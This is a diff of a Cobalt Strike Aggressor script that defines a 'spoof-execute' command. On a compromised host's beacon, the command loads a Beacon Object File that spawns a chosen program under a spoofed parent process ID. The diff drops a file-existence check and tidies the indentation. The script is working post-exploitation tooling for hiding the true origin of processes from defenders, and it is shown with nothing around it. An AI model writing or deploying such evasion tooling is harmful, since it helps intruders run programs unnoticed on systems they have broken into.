@@ -1,18 +1,6 @@
-import java.io.File;
-
-
-sub file_exists {
-    local('$filepath $file_obj');
-	
-	$filepath = $1;
-    $file_obj = [new File: $filepath];
-
-	return [$file_obj exists];
-}
-
 alias spoof-execute {
 
-	local('$barch $handle $data $temp $program $commandlineargs $args');
+    local('$barch $handle $data $temp $program $commandlineargs $args');
 	
     if(size(@_) < 3)
     {
@@ -21,26 +9,20 @@ alias spoof-execute {
         return;
     }
 	
-	$temp = substr($0, strlen("spoof-execute") + 1 + strlen($2) + 1);
+    $temp = substr($0, strlen("spoof-execute") + 1 + strlen($2) + 1);
 
-	$program = substr($temp, 0, indexOf($temp, ".exe") + 4);
+    $program = substr($temp, 0, indexOf($temp, ".exe") + 4);
     $commandlineargs = substr($temp, indexOf($temp, ".exe") + 4);
-
-    if (!file_exists($program))
-    {
-        berror($1, beacon_command_detail("spoof-execute"));
-        return;
-    }
 	
-	$barch = barch($1);
+    $barch = barch($1);
 
     $handle = openf(script_resource("dist/spoofSpawn. $+ $barch $+ .o"));
     $data = readb($handle, -1);
     closef($handle);
 
     $args = bof_pack($1,"iZZ", $2, $program, $commandlineargs);
-	btask($1, "Spawn Process PPID Spoofing by 0x3rhy");
-	btask($1, "Execute: $temp");
+    btask($1, "Spawn Process PPID Spoofing by 0x3rhy");
+    btask($1, "Execute: $temp");
     beacon_inline_execute($1, $data, "go", $args);
 
 }
